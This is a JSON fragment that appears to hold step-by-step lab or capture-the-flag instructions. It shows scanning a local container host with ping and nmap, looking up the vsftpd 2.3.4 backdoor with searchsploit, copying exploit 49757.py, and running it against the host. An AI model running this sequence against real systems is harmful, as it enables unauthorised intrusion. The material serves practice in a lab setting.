              {
                "step": "We proceed to recognize the machine with a ping",
                "command1": "ping -c 1 172.17.0.2"
              }
            ],
            "step2": [
              {
                "step": "We do an nmap to get more information about this machine",
                "command1": "nmap -p- -sC -sV --min-rate 5000 -vvv  --open -sS -n -Pn 172.17.0.2 -oN scan"
              }
            ],
            "step3": [
              {
                "step": "We search for the vulnerability with `searchsploit`",
                "command1": "searchsploit vsftpd 2.3.4"
              }
            ],
            "step4": [
              {
                "step": "We use python for this case, so we proceed to save the script with this command (the script is in PATH):",
                "command1": "searchsploit -m unix/remote/49757.py"
              }
            ],
            "step5": [
              {
                "step": "We run the script by passing the host, and done!",
                "command1": "python3 exploit.py 172.17.0.2"
              }
            ]
          }
